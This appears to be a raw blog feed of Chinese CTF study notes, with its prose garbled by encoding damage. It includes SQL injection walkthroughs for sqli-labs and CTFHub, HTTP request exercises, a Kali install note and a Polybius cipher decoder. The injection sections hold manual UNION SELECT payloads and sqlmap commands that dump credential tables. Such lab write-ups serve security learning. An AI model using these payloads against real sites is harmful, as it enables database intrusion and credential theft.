class="hljs-number">3</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,database()<br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables<br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) from information_schema.tables where table_schema=<span class="hljs-string">&#x27;security&#x27;</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) from information_schema.columns where table_schema=<span class="hljs-string">&#x27;security&#x27;</span> and table_name=<span class="hljs-string">&#x27;users&#x27;</span><br>http:<span class="hljs-regexp">//</span>x.x.x.x:x<span class="hljs-regexp">/Less-2/</span>?id=-<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(username,<span class="hljs-number">0</span>x3a,password) from users<br><br></code></pre></td></tr></table></figure><h3 id="æ–¹æ³•2ï¼šsqlmapå·¥å…·-åŒç¬¬01å…³"><a href="#æ–¹æ³•2ï¼šsqlmapå·¥å…·-åŒç¬¬01å…³" class="headerlink" title="æ–¹æ³•2ï¼šsqlmapå·¥å…· åŒç¬¬01å…³"></a>æ–¹æ³•2ï¼šsqlmapå·¥å…· åŒç¬¬01å…³</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 --dbs<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security --tables<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> --columns<br>sqlmap -u http://x.x.x.x:x/Less-1/?<span class="hljs-built_in">id</span>=1 -D security -T <span class="hljs-built_in">users</span> -C password,<span class="hljs-built_in">id</span>,username --dump<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€kaliã€‘hyper-vä¸­å®‰è£…kaliç³»ç»Ÿ</title>
    <link href="/2023/08/07/ctf/%E3%80%90kali%E3%80%91hyper-v%E4%B8%AD%E5%AE%89%E8%A3%85kali%E7%B3%BB%E7%BB%9F/"/>
    <url>/2023/08/07/ctf/%E3%80%90kali%E3%80%91hyper-v%E4%B8%AD%E5%AE%89%E8%A3%85kali%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h2><p><a href="https://www.kali.org/get-kali/#kali-platforms">https://www.kali.org/get-kali/#kali-platforms</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808100246.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808100309.png" alt="image.png"></p><p>ä¸‹è½½ä¹‹åï¼Œè§£å‹</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>hyper-væ–°å»ºè™šæ‹Ÿæœº<br>é€‰æ‹©â€œç¬¬äºŒä»£â€<br>ç¦ç”¨â€œå¯ç”¨å®‰å…¨å¯åŠ¨â€</p><h2 id="sshè¿œç¨‹è¿æ¥"><a href="#sshè¿œç¨‹è¿æ¥" class="headerlink" title="sshè¿œç¨‹è¿æ¥"></a>sshè¿œç¨‹è¿æ¥</h2><p><a href="https://blog.csdn.net/bangshao1989/article/details/125249371">https://blog.csdn.net/bangshao1989/article/details/125249371</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€è™šæ‹Ÿæœºã€‘hyper-vä¸­å®‰è£…kaliç³»ç»Ÿ</title>
    <link href="/2023/08/07/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91hyper-v%E4%B8%AD%E5%AE%89%E8%A3%85kali%E7%B3%BB%E7%BB%9F/"/>
    <url>/2023/08/07/net/%E3%80%90%E8%99%9A%E6%8B%9F%E6%9C%BA%E3%80%91hyper-v%E4%B8%AD%E5%AE%89%E8%A3%85kali%E7%B3%BB%E7%BB%9F/</url>
    
    <content type="html"><![CDATA[<h2 id="ä¸‹è½½"><a href="#ä¸‹è½½" class="headerlink" title="ä¸‹è½½"></a>ä¸‹è½½</h2><p><a href="https://www.kali.org/get-kali/#kali-platforms">https://www.kali.org/get-kali/#kali-platforms</a></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808100246.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230808100309.png" alt="image.png"></p><p>ä¸‹è½½ä¹‹åï¼Œè§£å‹</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>hyper-væ–°å»ºè™šæ‹Ÿæœº<br>é€‰æ‹©â€œç¬¬äºŒä»£â€<br>ç¦ç”¨â€œå¯ç”¨å®‰å…¨å¯åŠ¨â€</p><h2 id="sshè¿œç¨‹è¿æ¥"><a href="#sshè¿œç¨‹è¿æ¥" class="headerlink" title="sshè¿œç¨‹è¿æ¥"></a>sshè¿œç¨‹è¿æ¥</h2><p><a href="https://blog.csdn.net/bangshao1989/article/details/125249371">https://blog.csdn.net/bangshao1989/article/details/125249371</a></p>]]></content>
    
    
    <categories>
      
      <category>net</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfç³»åˆ—ã€‘CTFHUB</title>
    <link href="/2023/08/07/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91CTFHUB/"/>
    <url>/2023/08/07/ctf/%E3%80%90ctf%E7%B3%BB%E5%88%97%E3%80%91CTFHUB/</url>
    
    <content type="html"><![CDATA[<h2 id="web-è¯·æ±‚æ–¹å¼"><a href="#web-è¯·æ±‚æ–¹å¼" class="headerlink" title="web è¯·æ±‚æ–¹å¼"></a>web è¯·æ±‚æ–¹å¼</h2><p>HTTP è¯·æ±‚æ–¹æ³•, HTTP&#x2F;1.1åè®®ä¸­å…±å®šä¹‰äº†å…«ç§æ–¹æ³•ï¼ˆä¹Ÿå«åŠ¨ä½œï¼‰æ¥ä»¥ä¸åŒæ–¹å¼æ“ä½œæŒ‡å®šçš„èµ„æºã€‚</p><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/aFVx7vvx1bsSVoCk3zh68x.html">è¯·æ±‚æ–¹å¼-writeup</a></p><p>é‡ç‚¹å†…å®¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># curl -X æŒ‡å®šè¯·æ±‚æ–¹æ³•</span><br>curl -X CTFHUB http://challenge-f9bba78a0639c4e4.sandbox.ctfhub.com:10800/index.php<br></code></pre></td></tr></table></figure><h2 id="web-302è·³è½¬"><a href="#web-302è·³è½¬" class="headerlink" title="web 302è·³è½¬"></a>web 302è·³è½¬</h2><p>çŠ¶æ€ç 301ï¼šæ°¸ä¹…è·³è½¬ï¼ˆæ°¸ä¹…é‡å®šå‘ï¼‰ã€‚è¯·æ±‚çš„èµ„æºå·²è¢«æ°¸ä¹…çš„ç§»åŠ¨åˆ°æ–°URIï¼Œè¿”å›ä¿¡æ¯ä¼šåŒ…æ‹¬æ–°çš„URIï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å®šå‘åˆ°æ–°URIã€‚ä»Šåä»»ä½•æ–°çš„è¯·æ±‚éƒ½åº”ä½¿ç”¨æ–°çš„URIä»£æ›¿<br>çŠ¶æ€ç 302ï¼šä¸´æ—¶é‡å®šå‘</p><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/erBvC63BtiquPYT4C3MUzX.html">302è·³è½¬-writeup</a></p><p>é‡ç‚¹å†…å®¹ï¼š<br>1ï¼‰å¯ä»¥ç”¨curlç›´æ¥è®¿é—®<br>2ï¼‰ç”¨burpsuiteæ¥è®¿é—®</p><h2 id="Web-Cookie"><a href="#Web-Cookie" class="headerlink" title="Web Cookie"></a>Web Cookie</h2><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/6zSDRPLbitJ5j4e7CE9dLp.html">Cookie-witeup</a></p><h2 id="åŸºç¡€è®¤è¯"><a href="#åŸºç¡€è®¤è¯" class="headerlink" title="åŸºç¡€è®¤è¯"></a>åŸºç¡€è®¤è¯</h2><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/3mSzAzbGydVT74nsq1gcVj.html">åŸºç¡€è®¤è¯-writeip</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /flag.html HTTP/1.1<br>Host: challenge-879836353d25e7b6.sandbox.ctfhub.com:10800<br>Cache-Control: max-age=0<br>Authorization: Basic YWRtaW46MTIzNDU2            <span class="hljs-comment">### é‡ç‚¹</span><br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Referer: http://challenge-879836353d25e7b6.sandbox.ctfhub.com:10800/<br>Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6<br>Connection: close<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230807193523.png" alt="image.png"></p><p>é‡ç‚¹å†…å®¹ï¼šå–æ¶ˆPayload Encoding</p><h2 id="æ•´æ•°å‹æ³¨å…¥"><a href="#æ•´æ•°å‹æ³¨å…¥" class="headerlink" title="æ•´æ•°å‹æ³¨å…¥"></a>æ•´æ•°å‹æ³¨å…¥</h2><p><a href="https://writeup.ctfhub.com/Skill/Web/SQL%E6%B3%A8%E5%85%A5/jkJpSTk3mpi55uRMMk23TJ.html">æ•´æ•°å‹æ³¨å…¥-writeup</a></p><h3 id="æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥"><a href="#æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥" class="headerlink" title="æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥"></a>æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=-1 union select 1,group_concat(flag) from flag<br></code></pre></td></tr></table></figure><h3 id="æ–¹æ³•2ï¼šsqlmap"><a href="#æ–¹æ³•2ï¼šsqlmap" class="headerlink" title="æ–¹æ³•2ï¼šsqlmap"></a>æ–¹æ³•2ï¼šsqlmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 --dbs<br>sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 -D sqli --tables<br>sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 -D sqli -T flag --columns<br>sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 -D sqli -T flag -C flag --dump<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ctfé¢˜ç›®ç³»åˆ—ã€‘ctfhub webç±»å‹</title>
    <link href="/2023/08/07/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfhub%20web%E7%B1%BB%E5%9E%8B/"/>
    <url>/2023/08/07/ctf/%E3%80%90ctf%E9%A2%98%E7%9B%AE%E7%B3%BB%E5%88%97%E3%80%91ctfhub%20web%E7%B1%BB%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h2 id="web-è¯·æ±‚æ–¹å¼"><a href="#web-è¯·æ±‚æ–¹å¼" class="headerlink" title="web è¯·æ±‚æ–¹å¼"></a>web è¯·æ±‚æ–¹å¼</h2><p>HTTP è¯·æ±‚æ–¹æ³•, HTTP&#x2F;1.1åè®®ä¸­å…±å®šä¹‰äº†å…«ç§æ–¹æ³•ï¼ˆä¹Ÿå«åŠ¨ä½œï¼‰æ¥ä»¥ä¸åŒæ–¹å¼æ“ä½œæŒ‡å®šçš„èµ„æºã€‚</p><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/aFVx7vvx1bsSVoCk3zh68x.html">è¯·æ±‚æ–¹å¼-writeup</a></p><p>é‡ç‚¹å†…å®¹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># curl -X æŒ‡å®šè¯·æ±‚æ–¹æ³•</span><br>curl -X CTFHUB http://challenge-f9bba78a0639c4e4.sandbox.ctfhub.com:10800/index.php<br></code></pre></td></tr></table></figure><h2 id="web-302è·³è½¬"><a href="#web-302è·³è½¬" class="headerlink" title="web 302è·³è½¬"></a>web 302è·³è½¬</h2><p>çŠ¶æ€ç 301ï¼šæ°¸ä¹…è·³è½¬ï¼ˆæ°¸ä¹…é‡å®šå‘ï¼‰ã€‚è¯·æ±‚çš„èµ„æºå·²è¢«æ°¸ä¹…çš„ç§»åŠ¨åˆ°æ–°URIï¼Œè¿”å›ä¿¡æ¯ä¼šåŒ…æ‹¬æ–°çš„URIï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å®šå‘åˆ°æ–°URIã€‚ä»Šåä»»ä½•æ–°çš„è¯·æ±‚éƒ½åº”ä½¿ç”¨æ–°çš„URIä»£æ›¿<br>çŠ¶æ€ç 302ï¼šä¸´æ—¶é‡å®šå‘</p><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/erBvC63BtiquPYT4C3MUzX.html">302è·³è½¬-writeup</a></p><p>é‡ç‚¹å†…å®¹ï¼š<br>1ï¼‰å¯ä»¥ç”¨curlç›´æ¥è®¿é—®<br>2ï¼‰ç”¨burpsuiteæ¥è®¿é—®</p><h2 id="Web-Cookie"><a href="#Web-Cookie" class="headerlink" title="Web Cookie"></a>Web Cookie</h2><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/6zSDRPLbitJ5j4e7CE9dLp.html">Cookie-witeup</a></p><h2 id="åŸºç¡€è®¤è¯"><a href="#åŸºç¡€è®¤è¯" class="headerlink" title="åŸºç¡€è®¤è¯"></a>åŸºç¡€è®¤è¯</h2><p><a href="https://writeup.ctfhub.com/Skill/Web/Web%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/3mSzAzbGydVT74nsq1gcVj.html">åŸºç¡€è®¤è¯-writeip</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">GET /flag.html HTTP/1.1<br>Host: challenge-879836353d25e7b6.sandbox.ctfhub.com:10800<br>Cache-Control: max-age=0<br>Authorization: Basic YWRtaW46MTIzNDU2            <span class="hljs-comment">### é‡ç‚¹</span><br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br>Referer: http://challenge-879836353d25e7b6.sandbox.ctfhub.com:10800/<br>Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6<br>Connection: close<br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20230807193523.png" alt="image.png"></p><p>é‡ç‚¹å†…å®¹ï¼šå–æ¶ˆPayload Encoding</p><h2 id="æ•´æ•°å‹æ³¨å…¥"><a href="#æ•´æ•°å‹æ³¨å…¥" class="headerlink" title="æ•´æ•°å‹æ³¨å…¥"></a>æ•´æ•°å‹æ³¨å…¥</h2><p><a href="https://writeup.ctfhub.com/Skill/Web/SQL%E6%B3%A8%E5%85%A5/jkJpSTk3mpi55uRMMk23TJ.html">æ•´æ•°å‹æ³¨å…¥-writeup</a></p><h3 id="æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥"><a href="#æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥" class="headerlink" title="æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥"></a>æ–¹æ³•1ï¼šæ‰‹å·¥æ³¨å…¥</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=-1 union select 1,group_concat(flag) from flag<br></code></pre></td></tr></table></figure><h3 id="æ–¹æ³•2ï¼šsqlmap"><a href="#æ–¹æ³•2ï¼šsqlmap" class="headerlink" title="æ–¹æ³•2ï¼šsqlmap"></a>æ–¹æ³•2ï¼šsqlmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 --dbs<br>sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 -D sqli --tables<br>sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 -D sqli -T flag --columns<br>sqlmap -u http://challenge-6f42566cc885a992.sandbox.ctfhub.com:10800/?<span class="hljs-built_in">id</span>=1 -D sqli -T flag -C flag --dump<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2022å®‰å…¨æ¯”èµ›ä¸ªäººèµ›è§£é¢˜æ€è·¯</title>
    <link href="/2023/07/27/ctf/2022%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9B%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/"/>
    <url>/2023/07/27/ctf/2022%E5%AE%89%E5%85%A8%E6%AF%94%E8%B5%9B%E4%B8%AA%E4%BA%BA%E8%B5%9B%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<h2 id="heade3"><a href="#heade3" class="headerlink" title="heade3"></a>heade3</h2><p>Burpsuiteæ‹¦æˆª è®¿é—®    å‘ç°äº†flagå­—æ®µ</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Thu, 27 Jul 2023 06:03:34 GMT<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>3042<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/8.0.15<br><span class="hljs-attribute">Flag</span><span class="hljs-punctuation">: </span>flag&#123;9964ea2e-b321-4629-a613-780ff5441ee0&#125;<br><span class="hljs-attribute">Vary</span><span class="hljs-punctuation">: </span>Accept-Encoding<br></code></pre></td></tr></table></figure><h2 id="Polybius"><a href="#Polybius" class="headerlink" title="Polybius"></a>Polybius</h2><p>å°†é¢˜ç›®ä¸­çš„å‹ç¼©åŒ…è§£å‹åï¼Œçœ‹åˆ°æç¤ºå¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">æ£‹ç›˜:[[<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>], [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>], [<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>], [<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>], [<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>]]<br>å¯†æ–‡:13,43,42,22,33,35,21,54,21,21,21,21,21,21<br></code></pre></td></tr></table></figure><p>æ ¹æ®è¯¥æ ¼å¼ï¼Œä½¿ç”¨pythonè„šæœ¬æ¥è·å–è¾“å‡ºä¸ºï¼šæ˜æ–‡ï¼š THISFLAGAAAAAAï¼Œä½¿ç”¨flagåŒ…è£¹ï¼Œå³ä¸ºflag{THISFLAGAAAAAA}</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_polybius_square</span>(<span class="hljs-params">board</span>):<br>    <span class="hljs-comment"># åˆ›å»ºPolybiusæ£‹ç›˜ï¼Œä½¿ç”¨ç»™å®šçš„2å…ƒæ•°ç»„è¡¨ç¤º</span><br>    polybius_square = &#123;&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(board)):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(board[i])):<br>            polybius_square[board[i][j]] = (i + <span class="hljs-number">1</span>, j + <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">return</span> polybius_square<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_polybius</span>(<span class="hljs-params">polybius_square, ciphertext</span>):<br>    <span class="hljs-comment"># è§£å¯†Polybiuså¯†æ–‡</span><br>    plaintext = <span class="hljs-string">&quot;&quot;</span><br>    ciphertext = ciphertext.replace(<span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)  <span class="hljs-comment"># å»é™¤é€—å·åˆ†éš”</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(ciphertext), <span class="hljs-number">2</span>):<br>        row = <span class="hljs-built_in">int</span>(ciphertext[i])<br>        col = <span class="hljs-built_in">int</span>(ciphertext[i + <span class="hljs-number">1</span>])<br>        <span class="hljs-keyword">for</span> letter, position <span class="hljs-keyword">in</span> polybius_square.items():<br>            <span class="hljs-keyword">if</span> position == (row, col):<br>                plaintext += letter<br>                <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment"># ç»™å‡ºPolybiusæ£‹ç›˜ï¼Œä»¥2å…ƒæ•°ç»„è¡¨ç¤º</span><br>    chessboard = [[<span class="hljs-string">&#x27;U&#x27;</span>, <span class="hljs-string">&#x27;W&#x27;</span>, <span class="hljs-string">&#x27;T&#x27;</span>, <span class="hljs-string">&#x27;X&#x27;</span>, <span class="hljs-string">&#x27;M&#x27;</span>], [<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;S&#x27;</span>, <span class="hljs-string">&#x27;Y&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>], [<span class="hljs-string">&#x27;O&#x27;</span>, <span class="hljs-string">&#x27;R&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;N&#x27;</span>, <span class="hljs-string">&#x27;L&#x27;</span>], [<span class="hljs-string">&#x27;V&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;Z&#x27;</span>, <span class="hljs-string">&#x27;Q&#x27;</span>], [<span class="hljs-string">&#x27;P&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;K&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>]]<br>    <br>    <span class="hljs-comment"># ç»™å‡ºå¯†æ–‡ï¼Œæ¯ä¸¤ä¸ªå­—ç¬¦ç”¨é€—å·åˆ†éš”</span><br>    ciphertext = <span class="hljs-string">&quot;13,43,42,22,33,35,21,54,21,21,21,21,21,21&quot;</span><br><br>    <span class="hljs-comment"># åˆ›å»ºPolybiusæ£‹ç›˜</span><br>    polybius_square = create_polybius_square(chessboard)<br><br>    <span class="hljs-comment"># è§£å¯†å¹¶æ‰“å°æ˜æ–‡</span><br>    plaintext = decrypt_polybius(polybius_square, ciphertext)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;æ˜æ–‡ï¼š&quot;</span>, plaintext)<br></code></pre></td></tr></table></figure><h2 id="base32"><a href="#base32" class="headerlink" 